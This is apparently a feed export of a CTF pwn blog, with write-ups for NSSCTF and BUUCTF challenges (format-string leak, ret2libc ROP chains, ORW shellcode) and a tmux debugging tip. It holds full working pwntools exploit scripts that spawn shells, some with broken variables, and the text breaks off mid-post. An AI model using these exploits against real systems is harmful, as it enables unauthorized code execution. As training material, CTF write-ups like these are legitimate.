class="token string">'konw'</span><span class="token punctuation">,</span>b<span class="token string">'16'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sl<span class="token punctuation">(</span>b<span class="token string">'+'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sl(b'a')</span>ru<span class="token punctuation">(</span>b<span class="token string">'0'</span><span class="token punctuation">)</span>std <span class="token operator">=</span> int<span class="token punctuation">(</span>rec<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>prh<span class="token punctuation">(</span>std<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> std <span class="token operator">-</span> stderrputs <span class="token operator">=</span> libcbase<span class="token operator">+</span>putsprh<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>pr<span class="token punctuation">(</span>str<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>sda<span class="token punctuation">(</span>b<span class="token string">'try'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> <span class="token number">0x4040A0</span>shellcode <span class="token operator">=</span><span class="token triple-quoted-string string">'''nopnoppush 0x67616c66mov rdi, rspxor rdx, rdxxor rsi, rsipush 0x2pop raxsyscall'''</span><span class="token comment" spellcheck="true">#shellcraft.open("flag")</span>shellcode <span class="token operator">+=</span> <span class="token triple-quoted-string string">'''push 0x11pop raxpush 0x4041A0pop rsipush 0x3pop rdipush 0x64pop rdxpush 0x0pop r10syscall'''</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>bss <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/lmarch2/images/raw/master/Typora/202402050006046.png" alt="image-20240205000529665"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="NSSCTF" scheme="http://lmarch2.github.io/tags/NSSCTF/"/>
    
  </entry>
  
  <entry>
    <title>WSL2下不能使用gdb.attach的解决方案</title>
    <link href="http://lmarch2.github.io/posts/19b7c9d1/"/>
    <id>http://lmarch2.github.io/posts/19b7c9d1/</id>
    <published>2023-08-29T12:53:24.000Z</published>
    <updated>2024-02-04T06:46:48.950Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>pwndbg在WSL下一直没法使用下断点调试的功能，找了半天发现tmux可以帮助解决这个问题</p><h2 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h2><p>用root权限安装</p><blockquote><p>sudo apt-get install tmux</p></blockquote><p>进入根目录</p><blockquote><p>cd ~</p></blockquote><h2 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h2><p>使用root权限打开tmux，方便保存配置文件</p><blockquote><p>sudo tmux</p></blockquote><p>新建.tmux.conf文件</p><blockquote><p>vim .tmux.conf</p></blockquote><p>在文件中输入</p><pre><code>#输入bind-key c new-window -c "#{pane_current_path}"bind-key % split-window -h -c "#{pane_current_path}"bind-key '"' split-window -c "#{pane_current_path}"set -g mouse on</code></pre><p>关闭所有tmux窗口并输入</p><blockquote><p>tmux source-file ~/.tmux.conf</p></blockquote><p>重新启动tmux则完成更改、</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>接下来可以在exp中下断点了  <code>gdb.attach(p)</code></p><p>同时要在exp中加上指定terminal</p><blockquote><p>context.terminal = [‘tmux’, ‘splitw’, ‘-h’]</p></blockquote><p>-h代表横向分屏</p><p>之后就可以在运行exp时debug</p><p>注意要在tmux终端下运行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="tools and tricks" scheme="http://lmarch2.github.io/categories/tools-and-tricks/"/>
    
    
    <category term="pwn" scheme="http://lmarch2.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF ROUND#14 wp</title>
    <link href="http://lmarch2.github.io/posts/fa745d1d/"/>
    <id>http://lmarch2.github.io/posts/fa745d1d/</id>
    <published>2023-08-29T12:46:39.000Z</published>
    <updated>2024-02-04T06:52:26.261Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="NSSCTF-ROUND-14"><a href="#NSSCTF-ROUND-14" class="headerlink" title="NSSCTF ROUND#14"></a>NSSCTF ROUND#14</h1><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>程序开启NX和canary保护</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101239901.png" alt="image-20230810123951784"></p><p>vuln函数中存在栈溢出</p><p>变量v4 = 555，v5 = 520</p><p>read函数读入0x40字节，在printf处有格式化字符串漏洞</p><p>需要注意buf为bss段变量，非栈格式化字符串漏洞不能直接修改栈上的值，需要通过二级指针，即栈链间接修改</p><p>思路：</p><ol><li>利用格式化字符串漏洞任意写修改让v4=v5，进入vuln函数</li><li>利用格式化字符串泄露canary和__libc_start_main函数真实地址，计算出libc基址</li><li>构造pay覆盖返回地址为og或system rop链getshell</li></ol><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>将v4写为520。如图在栈偏移为3的地方有一个栈链：0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22b，可以用来修改0x22b为0x208</p><p>这里可构造pay为</p><blockquote><p>pay = ‘%’+str(8)+’c’+’%9$hhn’</p><p>或者</p><p>pay = ‘%’+str(520)+’c’+’%9$hhn’  （也可以直接n不用hhn）</p></blockquote><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101251928.png" alt="image-20230810125122840"></p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101249495.png" alt="image-20230810124947461"></p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>泄露canary 和 __libc_start_main地址</p><p>这里需要先patchelf再调试确定偏移</p><p>这题不仅要patch掉libc和ld，还要再patchelf –replace-needed libpthread.so.0 ./libpthread-2.31.so ./binary</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101359262.png" alt="image-20230810135900218"></p><p>确定canary的偏移为9+6 = 15；__libc_start_main+243便宜为11+6 = 17</p><blockquote><p>pay += ‘-%15$p-%17$p-‘</p></blockquote><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>覆盖返回地址为one_gadget，或者调用system函数</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101404124.png" alt="image-20230810140417092"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = remote('node4.anna.nssctf.cn',28157)</span>sda <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span>data<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sea <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span>data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span>data<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span>drop<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_addr64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">return</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_addr32</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">return</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pay <span class="token operator">=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c'</span><span class="token operator">+</span><span class="token string">'%9$hhn'</span>pay <span class="token operator">+=</span> <span class="token string">'-%15$p-%17$p-'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>sla<span class="token punctuation">(</span>b<span class="token string">'Toka\n'</span><span class="token punctuation">,</span>pay<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#泄露cannary</span>canary <span class="token operator">=</span> int<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libc</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">243</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00000000004013f3</span> <span class="token comment" spellcheck="true">#pay=b'A'*0x28+p64(canary)+b'A'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym['vuln'])</span><span class="token comment" spellcheck="true">#sla('level\n',pay)</span><span class="token comment" spellcheck="true">#libcbase = get_addr64()-libc.sym['puts']</span><span class="token comment" spellcheck="true">#lg('libcbase',libcbase)</span>lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'binsh'</span><span class="token punctuation">,</span>bin_sh_addr<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'level\n'</span><span class="token punctuation">)</span>ret <span class="token operator">=</span><span class="token number">0x000000000040101a</span> og <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span><span class="token number">0xe3b01</span><span class="token punctuation">,</span><span class="token number">0xe3b04</span><span class="token punctuation">]</span>pay <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>og<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pay = b'a'*0x28+p64(canary)+b'a'*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span>sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>ra<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="NSSCTF" scheme="http://lmarch2.github.io/tags/NSSCTF/"/>
    
  </entry>
  
  <entry>
    <title>ret2libc3合集</title>
    <link href="http://lmarch2.github.io/posts/be5100f9/"/>
    <id>http://lmarch2.github.io/posts/be5100f9/</id>
    <published>2023-08-29T12:45:22.000Z</published>
    <updated>2024-02-04T06:46:34.792Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>目前一些比较经典的ret2libc2的总合集，包括32位和64位，有libc文件和没有libc文件</p><p>ctf-wiki ret2libc3<br>考点：栈溢出rop</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 32-bit 开NX</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081254951.png"></p><p>漏洞和内存分析和之前的系列题类似，不赘述了</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081256604.png" alt="image-20230808125622556"></p><p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和/bin/sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081257190.png" alt="image-20230808125734100"></p><p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，/bin/sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和/bin/sh的地址，拿到shell</p><pre><code>#first expfrom pwn import *elf=ELF('ret2libc3')p=process('./ret2libc3')puts_plt=elf.plt['puts']puts_got=elf.got['puts']start_addr = elf.symbols['_start']payload1=b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)p.sendlineafter("!?",payload1)puts_addr=u32(p.recv(4))print("puts_got_addr = ",hex(puts_got_addr))print("puts_plt_addr = ",hex(puts_plt_addr))print("main_plt_addr = ",hex(main_plt_addr))print("puts addr = ", hex(puts_addr))p.interactive()</code></pre><pre><code>#second expfrom pwn import *p = process('./ret2libc3')elf = ELF('./ret2libc3')puts_got_addr = elf.got['puts']puts_plt_addr = elf.plt['puts']main_plt_addr = elf.symbols['_start']print("puts_got_addr = ",hex(puts_got_addr))print("puts_plt_addr = ",hex(puts_plt_addr))print("main_plt_addr = ",hex(main_plt_addr))p.recv()p.sendline(payload)puts_addr = u32(p.recv()[0:4])print("puts_addr = ",hex(puts_addr))sys_offset = 0x03cd10puts_offset = 0x067360sh_offset = 0x17b8cf#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算libc_base_addr = puts_addr - puts_offset #计算出libc基地址sys_addr = libc_base_addr + sys_offset #计算出system的真实地址sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址print("libc_base_addr = ",hex(libc_base_addr))print("sys_addr = ",hex(sys_addr))print("sh_addr = ",hex(sh_addr))payload2 = flat([b'A'*112, p32(sys_addr), "AAAA", p32(sh_addr)])p.sendline(payload2)p.interactive()</code></pre><p>或者写</p><pre><code>puts_addr = u64(p.recv(6).ljust(8,b'\x00'))</code></pre><h3 id="一定注意发送pay前接收的内容"><a href="#一定注意发送pay前接收的内容" class="headerlink" title="一定注意发送pay前接收的内容"></a>一定注意发送pay前接收的内容</h3><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>搜索libc常用方法：</p><ul><li><p>LibcSearcher</p></li><li><p>网站查找 <a href="https://libc.rip/">libc-database</a><br><a href="https://libc.blukat.me/?q=_rtld_global:0">llibc database search</a></p></li><li><p>libc-database</p></li><li><p>参考资料：<br><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br><a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></p><p><a href="https://www.jianshu.com/p/83f55c55c173">对于返回地址不同而导致的输入偏移不同</a></p></li></ul><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>简单的ret2libc3<br>file checksec —— 64-bit 开NX</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915622.webp"></p><p>再看看IDA</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081258517.png"></p><p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915382.png"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>分析大致流程就是</p><ol><li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li><li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li><li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’/bin/sh‘）</li></ol><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p><pre><code>from pwn import*from LibcSearcher import*p=remote('node4.buuoj.cn',28342)elf=ELF('./ciscn_2019_c_1')main=0x400b28pop_rdi=0x400c83ret=0x4006b9puts_plt=elf.plt['puts']puts_got=elf.got['puts']p.sendlineafter('choice!\n','1')payload='\0'+'a'*(0x50-1+8)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.sendlineafter('encrypted\n',payload)p.recvline()p.recvline()puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,'\0'))print hex(puts_addr)libc=LibcSearcher('puts',puts_addr)offset=puts_addr-libc.dump('puts')binsh=offset+libc.dump('str_bin_sh')system=offset+libc.dump('system')p.sendlineafter('choice!\n','1')payload='\0'+'a'*(0x50-1+8)payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(binsh)payload+=p64(system)p.sendlineafter('encrypted\n',payload)p.interactive()</code></pre><h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p><blockquote><p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p></blockquote><p>覆盖数据payload=b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p><p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p><blockquote><p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever=’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p></blockquote><p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p><p>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参<br><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915046.webp"></p><p>注意栈对齐<br><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081258686.webp"></p><p>还有最后还要再输一个0</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915042.webp"></p><p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p><h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p>BUUCTF pwn<br>考点： ret2libc3</p><h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>64位程序，开启NX</p><p>没有system函数和/bin/sh字符串</p><h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。</p><p>main函数</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142732.png" alt="image-20230807205450139"></p><p>sub_804871F函数</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142587.png" alt="image-20230807205837589"></p><p>sub_80487D0函数</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142267.png" alt="image-20230807205912958"></p><p>观察程序我们可以发现sub_80487D0函数有栈溢出漏洞</p><p>然而想要利用栈溢出需要我们达成两个目标</p><p>1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0</p><p>2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出</p><h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>首先第一步，我们知道，buf和s数组完全相等时，strncmp函数返回0，但是sprinf函数将随机数加到了s数组中，buf与s很难相等。不过在v1为0的时候strncmp函数也是会返回0的，而v1是读取的buf的大小，我们可以控制buf的第一位为’\x00’，可起到截断字符串长度的效果。</p><p>第二步，若要利用栈溢出ret2libc泄露write函数地址的话，起码需要231+4+4*5 = 255个字节，所以让buf[7] = ‘\xff’即可。代码中的buf[v5-1] = 0改变的是字符串末尾’\x00’的值，不影响buf[7] 。</p><p>所以第一次读取的payload为</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> b<span class="token string">'\x00'</span><span class="token operator">+</span>b<span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span></code></pre><h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>注意本题提供了libc，直接使用pwntools工具即可，不必使用LibcSearcher</p><p>main函数地址用elf.sym[‘main’]是找不到的，objdump 